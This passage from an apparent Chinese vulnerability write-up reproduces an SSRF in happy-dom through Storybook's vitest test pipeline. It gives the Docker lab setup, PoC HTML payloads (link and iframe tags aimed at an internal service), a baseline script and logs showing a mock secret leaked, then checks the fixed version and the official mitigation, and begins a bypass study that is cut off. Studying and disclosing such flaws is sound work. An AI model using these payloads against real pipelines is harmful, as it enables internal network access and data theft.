漏洞链路总览（图片：00-diagram-storybook-ssrf-chain.jpg）</em></p><p>触发条件只有两条：</p><ol><li><p>运行链路使用 Storybook 官方 vitest 插件 + <code>environment: 'happy-dom'</code>，且未设置 disable 开关；</p></li><li><p>story 渲染攻击者可控的 HTML（例如\"用户提交富文本\"组件）。</p></li></ol><p>两条同时满足时，<code>vitest run</code> 一执行，SSRF 就发生在 <code>innerHTML</code> 赋值的解析瞬间。注意这里没有 happy-dom 的显式 API 调用，也没有任何\"解析不可信 HTML\"的代码注释——这正是这类问题在真实项目里的样子：<strong>库被当作测试基础设施引入，加载行为跟着默认值一起被引入。</strong></p><h3 id=\"sec-51\">5.2 复现环境搭建</h3><h4 id=\"sec-52\">5.2.1 拓扑：一个受害进程 + 一个\"够不着\"的靶标</h4><p>Docker Compose 起两个服务，同处 <code>demo</code> 网络：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>服务</p></th><th colspan=\"1\" rowspan=\"1\"><p>角色</p></th><th colspan=\"1\" rowspan=\"1\"><p>网络暴露</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>app</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>受害者：Storybook 10 项目，执行官方测试链</p></td><td colspan=\"1\" rowspan=\"1\"><p>不发布端口，一次性容器（<code>compose run --rm</code>）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>intranet</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>靶标：模拟仅内网可达的敏感服务（云元数据替身）</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>不发布任何端口</strong>，仅服务名 <code>intranet:3000</code> 可解析</p></td></tr></tbody></table><p>靶标不可达的理由和第三章完全一致：任何一次 <code>[SSRF-HIT]</code> 都只可能来自容器内进程发起的请求，排除人工 curl 或浏览器误触。区别在于，这一次发起请求的容器里跑的不是一个手写的 HTTP 服务，而是一整套 <code>vitest + Storybook</code> 测试链。</p><pre><code># docker-compose.yml（节选）\nservices:\n  app:\n    build: { context: ./app }\n    environment:\n      HAPPY_DOM_VERSION: ${HAPPY_DOM_VERSION:-17.6.3}\n      HAPPY_DOM_SETTINGS: ${HAPPY_DOM_SETTINGS:-}\n    networks: [demo]\n    depends_on: [intranet]\n\n  intranet:\n    image: node:22-alpine\n    command: node /app/server.js\n    volumes: [./intranet/server.js:/app/server.js:ro]\n    networks: [demo]          # 没有 ports:，宿主机无法直连\n\nnetworks:\n  demo: {}\n</code></pre><h4 id=\"sec-53\">5.2.2 受害项目：Storybook 测试链</h4><p><code>app/package.json</code> 固定了全部版本：</p><pre><code>{\n  \"scripts\": { \"test\": \"vitest run\" },\n  \"devDependencies\": {\n    \"@storybook/addon-vitest\": \"10.6.5\",\n    \"@storybook/html-vite\": \"10.6.5\",\n    \"happy-dom\": \"17.6.3\",\n    \"storybook\": \"10.6.5\",\n    \"vitest\": \"4.1.12\"\n  }\n}\n</code></pre><blockquote><p>happy-dom 是 vitest 的环境依赖，所以放在 <code>devDependencies</code>；在 Storybook 仓库自身它则是运行时依赖。无论依赖类型如何，<strong>vitest 的 happy-dom 环境取的就是依赖树里解析出来的那一份</strong>，装的是哪个版本直接决定是否受影响。</p></blockquote><p><code>app/vitest.config.js</code> 是整条链的开关所在：</p><pre><code>import { defineProject } from 'vitest/config';\nimport { storybookTest } from '@storybook/addon-vitest/vitest-plugin';\n\nexport default defineProject({\n  plugins: [storybookTest({ configDir: './.storybook' })],\n  test: {\n    name: 'storybook-happy-dom',\n    environment: 'happy-dom',            // ← 漏洞触发点：DOM 由 Node 侧 happy-dom 提供\n    environmentOptions: {\n      happyDOM: {\n        url: 'http://intranet:3000/story',   // 见 5.4 的说明\n        settings: JSON.parse(process.env.HAPPY_DOM_SETTINGS || '{}'),\n      },\n    },\n    browser: { enabled: false },         // 非浏览器模式，DOM 完全来自 happy-dom\n    testTimeout: 15000,\n  },\n});\n</code></pre><p><code>app/.storybook/main.js</code> 用 <code>@storybook/html-vite</code> 框架并注册 <code>@storybook/addon-vitest</code>，保证 <code>storybookTest</code> 与真实项目同构。</p><h4 id=\"sec-54\">5.2.3 PoC story：攻击者提交的 HTML</h4><p><code>app/src/user-content.stories.js</code> 模拟\"渲染用户提交富文本\"的组件：没有组件本体，只用 renderer 的最小等价形态把用户 HTML 送进 DOM。</p><pre><code>const ATTACKER_HTML = [\n  '&lt;p&gt;Great article, thanks!&lt;/p&gt;',\n  // 向量 1：&lt;link rel=stylesheet&gt;\n  '&lt;link rel=\"stylesheet\" href=\"http://intranet:3000/attacker-probe.css\"&gt;',\n  // 向量 2：&lt;iframe src&gt;\n  '&lt;iframe src=\"http://intranet:3000/secret/metadata\" title=\"user-video\" width=\"1\" height=\"1\"&gt;&lt;/iframe&gt;',\n].join('\\n');\n\nconst meta = {\n  title: 'UserContent/Comment',\n  render: (args) =&gt; args.html,   // renderToCanvas 会执行 canvasElement.innerHTML = args.html\n  args: { html: ATTACKER_HTML },\n};\n</code></pre><p><code>play</code> 函数负责取证：等待异步资源加载完成，读取 <code>iframe.contentDocument</code>，把取回的内容原样打印。两个向量分工不同——<code>&lt;link&gt;</code> 命中证明\"解析即请求\"，<code>&lt;iframe&gt;</code> 命中证明\"响应体被取回进程内并可读\"。这正是 4.6.3 与 4.7.5 两条结论的现场验证。</p><h4 id=\"sec-55\">5.2.4 内网靶标：不可直接访问的敏感服务</h4><p><code>intranet/server.js</code> 是一个二十来行的 HTTP 服务，固定 token 便于严格断言：</p><pre><code>const SECRET_TOKEN = 'INTERNAL-ONLY-TOKEN-cve-2026-118660';\n\n// /attacker-probe.css → 记录（vector: &lt;link rel=stylesheet&gt;）\n// /secret/metadata    → 记录（vector: &lt;iframe src&gt;），返回\n//   &lt;html&gt;&lt;body&gt;SECRET: INTERNAL-ONLY-TOKEN-... (cloud-metadata-like internal data)&lt;/body&gt;&lt;/html&gt;\n</code></pre><p>每次命中打印一行 <code>[SSRF-HIT] &lt;时间&gt; GET &lt;路径&gt; from &lt;源IP&gt; | internal-only service reached!</code>，这行日志就是\"服务端真的发出了请求\"的物证。</p><h3 id=\"sec-56\">5.3 复现步骤（实测记录）</h3><h4 id=\"sec-57\">5.3.1 环境检查</h4><pre><code>uname -a; head -2 /etc/os-release; docker --version; docker compose version\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123625-9e639539-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=8e5176f5bfe326fe\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-2　5.3.1 远程环境检查：Ubuntu 26.04.1 LTS（aarch64）、Docker 29.9.3、Compose v5.7.0（图片：05-storybook-01-远程环境检查-01.png）</em></p><p>确认 aarch64、Docker 可用、<code>registry.npmjs.org</code> 可达（构建镜像需要 <code>npm ci</code>）。</p><h4 id=\"sec-58\">5.3.2 构建受害镜像</h4><pre><code>docker compose build app\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123626-9f0f1d1c-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=8b6a53a87c45d34d\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-3　5.3.2 </em><code>docker compose build app</code><em>：</em><code>Image cve-2026-118660-sb/app:latest Built</code><em>（图片：05-storybook-03-构建受害应用镜像-01.png）</em></p><p><code>node:22-alpine</code> + <code>npm ci</code>（<code>package-lock.json</code> 锁定 happy-dom=17.6.3），输出 <code>Image cve-2026-118660-sb/app:latest Built</code>。镜像只装依赖，不编译任何本地组件——受害者就是一个普通的 Storybook 项目。</p><h4 id=\"sec-59\">5.3.3 启动内网服务并确认外部不可达</h4><pre><code>docker compose up -d intranet\ndocker compose ps                     # 注意 PORTS 一列为空\ndocker compose exec -T intranet wget -qO- http://127.0.0.1:3000/healthz   # → ok\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123627-9fb697eb-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=72e1158dd18acf90\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-4　5.3.3 启动内网服务：</em><code>intranet</code>_ Running 且 <code>PORTS</code> 列为空，healthz 返回 <code>ok</code>（图片：05-storybook-04-启动内网服务-01.png）_</p><p><code>PORTS</code> 为空是关键：宿主机与外部网络都没有通往 <code>intranet:3000</code> 的路由。</p><h4 id=\"sec-60\">5.3.4 运行 Storybook 测试链（核心步骤）</h4><pre><code>docker compose run --rm app\n</code></pre><p>这一步等价于项目里 <code>storybook test</code> 的底层链路：<code>storybookTest</code> 插件把 story 转成 vitest 测试，vitest 用 <code>environment: 'happy-dom'</code> 在 Node 进程内提供 DOM。完整输出：</p><pre><code>[+] run 2/2\n ✔ Container cve-2026-118660-sb-intranet-1  Running\n ✔ Container cve-2026-118660-sb-app-run-f3c8e31c26c  Created\n[run] happy-dom version in node_modules: 17.6.3\n[run] storybook version: 10.6.5\n[run] renderer: 10.6.5 (@storybook/html-vite)\n[run] running Storybook test pipeline: vitest run (storybookTest plugin, environment: happy-dom)\n---------------------------------------------------------------------------\n\n RUN  v4.1.12 /app\n\nstdout | src/user-content.stories.js &gt; Submitted comment (attacker-controlled HTML)\n[STORYBOOK-POC] stylesheet-loaded-href=http://intranet:3000/attacker-probe.css\n[STORYBOOK-POC] iframe-reflected-content=\"SECRET: INTERNAL-ONLY-TOKEN-cve-2026-118660 (cloud-metadata-like internal data)\"\n[STORYBOOK-POC] RESULT=internal-secret-leaked (iframe content readable by story code)\n\n ✓ storybook-happy-dom src/user-content.stories.js (1 test) 24ms\n   ✓ Submitted comment (attacker-controlled HTML) 23ms\n\n  Test Files  1 passed (1)\n       Tests  1 passed (1)\n   Start at  22:33:32\n   Duration  356ms\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123628-a064acdd-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=bf3c027826559339\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-5　5.3.4 </em><code>docker compose run --rm app</code><em>：测试通过的同时打出回显的机密 token（图片：05-storybook-05-漏洞触发-运行Storybook测试链-01.png）</em></p><p>这里值得停一下：测试是<strong>通过</strong>的。没有任何断言失败，没有任何异常，日志里的 <code>stylesheets-loaded</code> 甚至像一条正常的调试信息。SSRF 不是以\"报错\"的形式出现的。</p><h4 id=\"sec-61\">5.3.5 内网服务侧取证</h4><pre><code>docker compose logs intranet\n</code></pre><pre><code>intranet-1  | [intranet] internal-only service on :3000 (token=INTERNAL-ONLY-TOKEN-cve-2026-118660)\nintranet-1  | [SSRF-HIT] 2026-11-05T22:33:32.956Z GET /attacker-probe.css from ::ffff:172.18.0.3 | internal-only service reached! (vector: &lt;link rel=stylesheet&gt;)\nintranet-1  | [SSRF-HIT] 2026-11-05T22:33:32.957Z GET /secret/metadata from ::ffff:172.18.0.3 | internal-only service reached! (vector: &lt;iframe src&gt;)\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123629-a1021f63-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=deddb9f4cec27a32\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-6　5.3.5 内网服务日志：两条 </em><code>[SSRF-HIT]</code><em>，来源 </em><code>::ffff:172.18.0.3</code><em>（图片：05-storybook-06-内网服务命中日志-01.png）</em></p><h3 id=\"sec-62\">5.4 证据解读</h3><ul><li><p>**来源 IP 是 **<code>172.18.0.3</code>，即运行 Storybook 测试链的 <code>app</code> 容器；提交 HTML 的攻击者对 <code>intranet</code> 没有任何直接访问通道。</p></li><li><p><strong>两条请求间隔 1ms（.956Z / .957Z）</strong>，落在 5.3.4 中 24ms 完成的同一个测试时间窗内，说明它们来自同一次 <code>innerHTML</code> 解析，而不是两次独立操作。整个测试仅 23–24ms 也排除了等待、重试这类偶然因素。</p></li><li><p><strong>两条命中分别对应 </strong><code>&lt;link&gt;</code><strong> 与 </strong><code>&lt;iframe&gt;</code><strong> 向量</strong>，路径 <code>/attacker-probe.css</code>、<code>/secret/metadata</code> 与 story 里写死的 URL 完全一致。</p></li><li><p><strong>token 出现在两个位置</strong>：<code>intranet</code> 自己的响应体，以及 5.3.4 的测试 stdout。后者是 <code>play</code> 函数从 <code>iframe.contentDocument</code> 中读出的，证明数据已经<strong>进入受害进程</strong>，完成了从 SSRF 到信息泄露的最后一步。</p></li></ul><h4 id=\"sec-63\">关于同源设定的说明</h4><p><code>vitest.config.js</code> 把 <code>environmentOptions.happyDOM.url</code> 设成与内网服务同源的 <code>http://intranet:3000/story</code>，用于演示 <code>play</code> 读取 iframe 内容这条回显路径——同源时 happy-dom 才允许脚本读取 <code>contentDocument</code>。</p><p><strong>SSRF 出网请求本身与同源与否无关。</strong> 两次命中都发生在解析 <code>innerHTML</code> 的瞬间，此时 URL 只是给文档一个基准地址；真实跨源场景下请求同样会发出，区别仅在于 story 代码读取 iframe 内容时受同源策略限制。即<strong>跨源只会削弱\"回显\"，不会削弱\"出网\"</strong>。</p><p>这与 4.7.3 的结论也对得上：真正决定\"能不能读到\"的是宿主应用能否走 frame 树（<code>childFrames[i].window.document</code>），而不是页面脚本能否过 <code>contentWindow</code> 代理。story 里用 <code>contentDocument</code> 是为了演示最\"规矩\"的一条路，实际危害面比它更宽。</p><h3 id=\"sec-64\">5.5 对照实验：修复版与官方缓解</h3><p>单次触发只能证明\"能打\"，还不足以证明\"打的就是这个漏洞\"。因此补两组对照，共用同一份 story、同一套命令，只改版本或配置：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>组别</p></th><th colspan=\"1\" rowspan=\"1\"><p>happy-dom</p></th><th colspan=\"1\" rowspan=\"1\"><p>配置</p></th><th colspan=\"1\" rowspan=\"1\"><p>内网命中</p></th><th colspan=\"1\" rowspan=\"1\"><p>机密回显</p></th><th colspan=\"1\" rowspan=\"1\"><p>判定</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>1. 漏洞复现</p></td><td colspan=\"1\" rowspan=\"1\"><p>17.6.3（storybook 仓库 yarn.lock 实测解析版本）</p></td><td colspan=\"1\" rowspan=\"1\"><p>默认</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>2 次</strong></p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>是</strong>（token 完整回显）</p></td><td colspan=\"1\" rowspan=\"1\"><p>✅ 漏洞触发</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>2. 修复对照</p></td><td colspan=\"1\" rowspan=\"1\"><p>21.0.4</p></td><td colspan=\"1\" rowspan=\"1\"><p>默认</p></td><td colspan=\"1\" rowspan=\"1\"><p>0 次</p></td><td colspan=\"1\" rowspan=\"1\"><p>否</p></td><td colspan=\"1\" rowspan=\"1\"><p>✅ 修复版有效</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>3. 缓解对照</p></td><td colspan=\"1\" rowspan=\"1\"><p>17.6.3</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>disableIframePageLoading</code> + <code>disableCSSFileLoading</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>0 次</p></td><td colspan=\"1\" rowspan=\"1\"><p>否</p></td><td colspan=\"1\" rowspan=\"1\"><p>✅ 官方缓解有效</p></td></tr></tbody></table><p>切换配置用 <code>--no-save</code>，只改 <code>node_modules</code>，不动 <code>package.json</code>：</p><pre><code># 组 2：升级到修复版\ndocker compose run --rm -e HAPPY_DOM_VERSION=21.0.4 app\n\n# 组 3：留在 17.6.3，打开两个 disable 开关（settings 由 vitest 配置透传）\ndocker compose run --rm \\\n  -e HAPPY_DOM_VERSION=17.6.3 \\\n  -e 'HAPPY_DOM_SETTINGS={\"disableIframePageLoading\":true,\"disableCSSFileLoading\":true}' \\\n  app\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1225%2Fbb26ea1d-09f.png&amp;mode=full&amp;exp=1794787200&amp;sig=17b79d1ae0e6aa17\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 5-7　5.5 组 2（21.0.4）：</em><code>CSS file loading is disabled</code>_ / <code>Iframe page loading is disabled</code>（图片：05-storybook-07-修复对照-happy-dom-21.0.4-01.png）_</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123630-a1db8c65-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=e14c7aee3824f7bd\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-8　5.5 组 3（17.6.3 + 两个 disable 开关）：同样 </em><code>RESULT=no-iframe-content-reflected</code><em>（图片：05-storybook-09-缓解对照-官方disable开关-01.png）</em></p><p>两组的共同结果：</p><ul><li><p><code>intranet</code> 侧 **0 条 **<code>[SSRF-HIT]</code>（对照组运行前用 <code>--force-recreate</code> 重建内网服务清空日志，避免上一组记录污染断言）；</p></li><li><p>story 输出 <code>RESULT=no-iframe-content-reflected</code>；</p></li><li><p>happy-dom 21 还会在控制台打出 <code>Iframe page loading is disabled</code> 一类错误，是\"默认值翻转\"生效的直接证据。</p></li></ul><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1226%2F18b1b2f9-be1.png&amp;mode=full&amp;exp=1794787200&amp;sig=7baeb76340f67bd6\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 5-9　5.5 组 2 的 </em><code>intranet</code><em> 日志：只有启动行，0 条 </em><code>[SSRF-HIT]</code><em>（图片：05-storybook-08-修复对照-内网服务无命中-01.png）</em></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1227%2F83e4990d-b56.png&amp;mode=full&amp;exp=1794787200&amp;sig=0e16a73ef33323e9\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 5-10　5.5 组 3 的 </em><code>intranet</code><em> 日志：同样 0 条命中（图片：05-storybook-10-缓解对照-内网服务无命中-01.png）</em></p><p>用 <code>verify.sh</code> 把三组串起来做严格断言（版本、命中条数、回显内容逐项校验）：</p><pre><code>./verify.sh      # 结束后自动 docker compose down，镜像保留\n</code></pre><pre><code>RESULT: 9 passed, 0 failed\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123632-a29912b7-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=1c737ec3cbe4c2a2\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-11　5.5 </em><code>./verify.sh</code><em>：三组 9 项断言全过（图片：05-storybook-11-一键验证-verify.sh-01.png）</em></p><p>9 项断言全部通过，\"漏洞组 2 次命中 + 修复组 0 命中 + 缓解组 0 命中\"因此可重复、可自动判定，而不依赖人工比对截图。</p><h3 id=\"sec-65\">5.6 为什么这是真实风险，而不只是\"测试噪音\"</h3><p>\"测试里加载一个 iframe，本来就该发生\"这个说法忽略了三件事。第一件事在 2.5 已经说过——发起方从浏览器变成了 Node 进程——这里只补另外两件。</p><p><strong>攻击入口是普通业务输入。</strong> 攻击者不需要接触 story 代码，只需提交一段带 <code>&lt;iframe&gt;</code> 的评论或富文本。项目只要存在\"渲染用户 HTML\"的组件，并在测试或预渲染中经过 happy-dom，用户输入就直接变成了服务端请求。Storybook 只是恰好提供了一个现成的、编译好的渲染管线。</p><p><strong>测试进程往往被信任。</strong> CI 日志里的外部 URL 请求通常不会被当成安全事件，测试环境的出网限制也常比生产环境宽松。而这类请求又发生在\"测试通过\"的绿色输出里，既没有异常也没有失败，正好落在监控的盲区。这让整条路径既好用又隐蔽。</p><p>所以修复动作不是\"把测试里的 iframe 删掉\"，而是<strong>让 DOM 实现默认不再自动加载外部资源</strong>——以及，在应用侧承认\"渲染用户 HTML\"本身就是一条需要设防的链路。</p><h3 id=\"sec-66\">5.7 与第三章的对照</h3><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>维度</p></th><th colspan=\"1\" rowspan=\"1\"><p>第三章（自建应用）</p></th><th colspan=\"1\" rowspan=\"1\"><p>本章（Storybook + Vitest）</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>入口</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>page.content = html</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>canvasElement.innerHTML = html</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>DOM 提供方</p></td><td colspan=\"1\" rowspan=\"1\"><p>应用自己 <code>new Browser()</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>vitest 的 happy-dom 环境</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>受影响版本</p></td><td colspan=\"1\" rowspan=\"1\"><p>20.14.6</p></td><td colspan=\"1\" rowspan=\"1\"><p>17.6.3</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>请求发起进程</p></td><td colspan=\"1\" rowspan=\"1\"><p>web 容器里的 Node 进程</p></td><td colspan=\"1\" rowspan=\"1\"><p>测试容器里的 Node 进程</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>数据回显方式</p></td><td colspan=\"1\" rowspan=\"1\"><p>应用读 <code>childFrames</code> 后写进 JSON 响应</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>play</code> 读 <code>iframe.contentDocument</code> 后打印</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>共同点</p></td><td colspan=\"1\" rowspan=\"1\"><p>两个向量、同一次解析、默认配置</p></td><td colspan=\"1\" rowspan=\"1\"><p>同左</p></td></tr></tbody></table><p>两条链在函数层面完全重合：都是 <code>innerHTML</code> / <code>document.write</code> 进入 <code>HTMLParser</code>，都是连接边沿触发 <code>connectedToDocument</code>，最后都落到 <code>Fetch.sendRequest</code>。差异只在宿主怎么用这个库。</p><p>下一章讨论最后一件事：如果升级到修复版本，这条链还通不通？</p><hr><h2 id=\"sec-67\">六、修复版本的绕过尝试</h2><p>21.0.0 的修复把两个默认值翻了过来。这一章要回答两个问题：</p><ol><li><p>这个修复模型盖住了哪些出口，又漏了哪些？</p></li><li><p>如果使用方按公告自行加了一道过滤，这道过滤算不算边界？</p></li></ol><p>实验分两个方向：<strong>方向一</strong>在库内找一个补丁没盖到的声明式出口；<strong>方向二</strong>在库外，假设应用层已经加了\"只允许相对 / 同源 href\"的过滤器，看它能不能把请求送到内网。</p><h3 id=\"sec-68\">6.1 补丁与基线</h3><p>修复 commit 的行为改动只有三处：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>位置</p></th><th colspan=\"1\" rowspan=\"1\"><p>修复前</p></th><th colspan=\"1\" rowspan=\"1\"><p>修复后</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>DefaultBrowserSettings</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>只有 <code>disableCSSFileLoading</code> / <code>disableIframePageLoading</code>（默认 <code>false</code>）</p></td><td colspan=\"1\" rowspan=\"1\"><p>新增 <code>enableCSSFileLoading</code> / <code>enableIframePageLoading</code>（默认 <code>false</code>）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>HTMLIFrameElement.#loadPage</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>只检查 <code>disableIframePageLoading</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>双条件：<code>disableIframePageLoading</code> 或 <code>!enableIframePageLoading</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>HTMLLinkElement</code> 的 style 路径</p></td><td colspan=\"1\" rowspan=\"1\"><p>只检查 <code>disableCSSFileLoading</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>双条件：<code>disableCSSFileLoading</code> 或 <code>!enableCSSFileLoading</code></p></td></tr></tbody></table><p>三处分别落在 <code>lib/browser/DefaultBrowserSettings.js</code>、<code>lib/nodes/html-iframe-element/HTMLIFrameElement.js</code> 的 <code>#loadPage</code>、<code>lib/nodes/html-link-element/HTMLLinkElement.js</code> 的 <code>#loadStyleSheet</code> 与 <code>#preloadResource</code> 的 style 分支上。</p><p>它没有做的是：URL allowlist、内网网段过滤、重定向目标校验、统一的 <code>Fetch</code> 出网策略。对照 4.4 与 4.5 的结论，这正好意味着\"出口仍然是原来那个出口，只是在几个入口前加了门\"。</p><p>原 CVE 的向量只有两个标签：</p><pre><code>&lt;link rel=\"stylesheet\" href=\"http://内网/style.css\"&gt;\n&lt;iframe src=\"http://内网/metadata\"&gt;&lt;/iframe&gt;\n</code></pre><p>同一份 HTML 分别在 20.14.6 与 21.0.4 的默认设置下解析，期望命中数从 2 变成 0。</p><h4 id=\"sec-69\">6.1.1 本地基线脚本</h4><p>先建两个目录，各装一个版本，把下面这份脚本分别复制进去运行：</p><pre><code>mkdir -p baseline/v20 baseline/v21\n# 把 baseline-check.mjs 分别放进两个目录\n(cd baseline/v20 &amp;&amp; npm init -y &gt;/dev/null &amp;&amp; npm install happy-dom@20.14.6)\n(cd baseline/v21 &amp;&amp; npm init -y &gt;/dev/null &amp;&amp; npm install happy-dom@21.0.4)\n(cd baseline/v20 &amp;&amp; node baseline-check.mjs)\n(cd baseline/v21 &amp;&amp; node baseline-check.mjs)\n</code></pre><pre><code>// baseline-check.mjs —— 原 CVE 向量在默认设置下的对照\nimport http from 'node:http';\nimport { readFileSync } from 'node:fs';\nimport { Window } from 'happy-dom';\n\nconst PORT = 31091, BASE = `http://127.0.0.1:${PORT}`;\nconst hits = [];\nconst server = http.createServer((req, res) =&gt; {\n    if (req.url === '/report') { res.writeHead(200); return res.end(JSON.stringify(hits)); }\n    hits.push(req.url);\n    const css = req.url.endsWith('.css');\n    res.writeHead(200, { 'Content-Type': css ? 'text/css' : 'text/html' });\n    res.end(css ? 'body{color:red}' : '&lt;html&gt;&lt;body&gt;SECRET: INTERNAL-ONLY-TOKEN&lt;/body&gt;&lt;/html&gt;');\n});\nawait new Promise((r) =&gt; server.listen(PORT, '127.0.0.1', r));\n\nconst { version } = JSON.parse(readFileSync('./node_modules/happy-dom/package.json', 'utf8'));\nconsole.log(`happy-dom@${version} | new Window({ url })  // 不传 settings`);\n\nconst w = new Window({ url: BASE + '/' });\nw.document.write(`&lt;link rel=\"stylesheet\" href=\"${BASE}/style.css\"&gt;&lt;iframe src=\"${BASE}/metadata\"&gt;&lt;/iframe&gt;`);\nawait new Promise((r) =&gt; setTimeout(r, 1500));\nconst frame = w.document.querySelector('iframe');\nconst win = frame.contentWindow;\nconst reflected = win &amp;&amp; win.document.body ? win.document.body.innerHTML : null;\nconsole.log('hits         :', hits.length, hits.join(', ') || '(none)');\nconsole.log('iframeContent:', reflected === null ? 'null (no contentWindow)' : JSON.stringify(reflected));\nw.close(); server.close();\n</code></pre><p>实测输出。</p><p>修复前（20.14.6）：</p><pre><code>happy-dom@20.14.6 | new Window({ url })  // 不传 settings\nhits         : 2 /style.css, /metadata\niframeContent: \"SECRET: INTERNAL-ONLY-TOKEN\"\n</code></pre><p>修复后（21.0.4）：</p><pre><code>happy-dom@21.0.4 | new Window({ url })  // 不传 settings\nhits         : 0 (none)\niframeContent: null (no contentWindow)\n</code></pre><blockquote><p>原始 PoC 用 <code>Browser</code>，在 app 容器里解析 HTML，目标是一个只在内网可达的容器服务；这里用 <code>Window</code>。两者最终都落到同一个 <code>Fetch</code> 出口，载荷与判定结论一致。换成 <code>Window</code> 是为了让后续绕过实验不依赖 Docker，跑得更快、更容易复现。</p></blockquote><h3 id=\"sec-70\">6.2 实验设置与判定</h3><h4 id=\"sec-71\">6.2.1 环境</h4><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>项</p></th><th colspan=\"1\" rowspan=\"1\"><p>值</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Node</p></td><td colspan=\"1\" rowspan=\"1\"><p>26.12.1 实测，20+ 可运行</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>happy-dom</p></td><td colspan=\"1\" rowspan=\"1\"><p>21.0.4，版本写死，不用 <code>^</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>平台</p></td><td colspan=\"1\" rowspan=\"1\"><p>macOS arm64 实测，Linux 亦可</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>网络</p></td><td colspan=\"1\" rowspan=\"1\"><p>只走 <code>127.0.0.1</code>，不出公网</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>端口</p></td><td colspan=\"1\" rowspan=\"1\"><p>30091 / 30092 / 31091，冲突可换</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>依赖</p></td><td colspan=\"1\" rowspan=\"1\"><p>Node 内置模块 + <code>happy-dom</code>，无测试框架、无 Docker</p></td></tr></tbody></table><p>文中 <code>lib/**/*.js</code> 的行号都取自 21.0.4 的编译产物。21.0.0 到 21.0.4 之间 <code>Fetch.js</code> 有过改动（<code>handleRedirectResponse</code> 里补上了跨源重定向删除 <code>Authorization</code> 的处理），行号基本对得上，但代码内容会差一段，对照时以 21.0.4 为准。</p><h4 id=\"sec-72\">6.2.2 三个测试</h4><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>测试</p></th><th colspan=\"1\" rowspan=\"1\"><p>验证什么</p></th><th colspan=\"1\" rowspan=\"1\"><p>载荷</p></th><th 